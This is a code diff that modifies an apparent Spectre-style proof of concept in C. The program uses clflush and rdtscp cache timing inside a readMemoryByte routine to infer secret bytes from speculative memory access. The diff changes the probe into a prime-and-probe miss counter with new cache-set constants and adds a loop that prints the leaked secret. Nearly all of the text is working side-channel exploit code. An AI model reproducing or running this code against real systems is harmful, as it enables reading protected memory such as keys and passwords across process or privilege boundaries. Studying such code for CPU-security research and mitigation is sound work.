@@ -8,10 +8,11 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DIST 256
-#define SET 32
+#define DIST 256 // 64 * 4 for preventing prefetching
+#define SET 128 //16 * ways 
 #define WAY 8
-#define INDEX 16
+#define LINE 64
+#define INDICES 16
 
 /********************************************************************
 Victim code.
@@ -57,7 +58,7 @@ Analysis code
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-  static int results[SET];
+  static int results[INDICES];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
@@ -72,13 +73,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       _mm_clflush( & array2[i * DIST]); /* intrinsic for clflush instruction */
 
 	// prime data over cache
-	printf("priming...\n");
+	//printf("priming...\n");
 	for( i=0;i<SET;i++) {
-      	mix_i = ((i * 167) + 13) & (SET-1);
+      	//mix_i = ((i * 167) + 13) & (SET-1);
+		mix_i = i;
 		time1 = __rdtscp(&junk);
 		temp&= array2[mix_i * DIST];
 		time2 = __rdtscp(&junk) - time1;
-	  	printf("%03d : 0x%02X's access time is %d\n",i,mix_i,time2);
+	  	//printf("%03d : 0x%02X's access time is %d\n",i,mix_i,time2);
 	}
 
 
@@ -103,6 +105,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < SET; i++) {
       mix_i = ((i * 167) + 13) & (SET-1);
+	  //mix_i = i;
       addr = & array2[mix_i * DIST];
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
@@ -113,13 +116,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	  } else {
 		  printf("miss\n");
 	  }
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
+      if (time2 >= L1_CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+        results[mix_i%INDICES]++; /* cache miss - add +1 to score for this value */
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
     j = k = -1;
-    for (i = 0; i < SET; i++) {
+    for (i = 0; i < INDICES; i++) {
       if (j < 0 || results[i] >= results[j]) {
         k = j;
         j = i;
@@ -161,6 +164,9 @@ int main(int argc,
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
+  }
+  while( len++<40) {
+	  printf("%x", (*(secret+len))%16);
   }
   return (0);
 }
